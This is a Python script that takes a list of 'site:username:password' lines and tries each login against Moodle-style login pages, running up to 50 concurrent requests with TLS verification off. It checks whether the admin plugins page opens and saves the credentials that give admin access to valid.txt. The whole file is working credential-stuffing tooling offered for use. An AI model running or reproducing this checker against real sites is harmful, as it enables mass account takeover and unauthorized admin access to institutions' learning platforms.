import asyncio
import aiohttp
import aiofiles
import re
from urllib.parse import urlparse
from bs4 import BeautifulSoup

MAX_CONCURRENT_REQUESTS = 50  # Adjust this based on your system/network

def ensure_scheme(url):
    if not url.startswith(('http://', 'https://')):
        return 'https://' + url
    return url

def parse_login_input(login_input):
    match = re.match(r'([^:]+://[^:]+/login/index\.php):([^:]+):(.+)', login_input.strip())
    if not match:
        raise ValueError("Invalid format. Use: https://example.com/login/index.php:username:password")
    return match.groups()

async def get_login_token(session, login_url):
    async with session.get(login_url) as resp:
        text = await resp.text()
        soup = BeautifulSoup(text, 'html.parser')
        token_tag = soup.find('input', {'name': 'logintoken'})
        if token_tag:
            return token_tag['value']
        else:
            raise Exception("Login token not found")

async def check_plugins_page(session, base_url):
    plugins_url = f"{base_url}/admin/plugins.php"
    async with session.get(plugins_url) as resp:
        text = await resp.text()
        if resp.status == 200 and "Plugins" in text:
            return True
    return False

async def save_valid(line):
    async with aiofiles.open("valid.txt", "a") as f:
        await f.write(line + "\n")

async def check_single_login(session, login_input, semaphore):
    async with semaphore:
        try:
            login_url, username, password = parse_login_input(login_input)
            login_url = ensure_scheme(login_url)
        except ValueError as ve:
            return f"❌ {ve} - Skipping line.", False

        parsed_url = urlparse(login_url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"

        try:
            logintoken = await get_login_token(session, login_url)
        except Exception as e:
            return f"Error retrieving token for {username}@{base_url}: {e}", False

        payload = {
            'logintoken': logintoken,
            'username': username,
            'password': password
        }

        try:
            async with session.post(login_url, data=payload, allow_redirects=True) as resp:
                final_url = str(resp.url)
                if "login/index.php" not in final_url:
                    plugins_ok = await check_plugins_page(session, base_url)
                    if plugins_ok:
                        await save_valid(login_input)  # Save valid
                        return f"✅ [{username}@{base_url}] Login and Plugins check SUCCESS", True
                    else:
                        return f"⚠️ [{username}@{base_url}] Plugins page check FAILED", False
                else:
                    return f"❌ [{username}@{base_url}] Login failed!", False
        except asyncio.TimeoutError:
            return f"⏰ Timeout during login for [{username}@{base_url}]", False
        except Exception as e:
            return f"❌ Exception during login for [{username}@{base_url}]: {e}", False

async def main(filename):
    timeout = aiohttp.ClientTimeout(total=30)
    connector = aiohttp.TCPConnector(ssl=False)
    semaphore = asyncio.Semaphore(MAX_CONCURRENT_REQUESTS)

    async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
        async with aiofiles.open(filename, mode='r') as f:
            lines = await f.readlines()

        tasks = [check_single_login(session, line.strip(), semaphore) for line in lines if line.strip() and not line.startswith("#")]

        success_count = 0
        for coro in asyncio.as_completed(tasks):
            result, success = await coro
            print(result)
            if success:
                success_count += 1

        print(f"\n✅ Total Successful Logins: {success_count} / {len(tasks)}")

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python3 script.py <filename>")
        exit(1)
    filename = sys.argv[1]
    asyncio.run(main(filename))
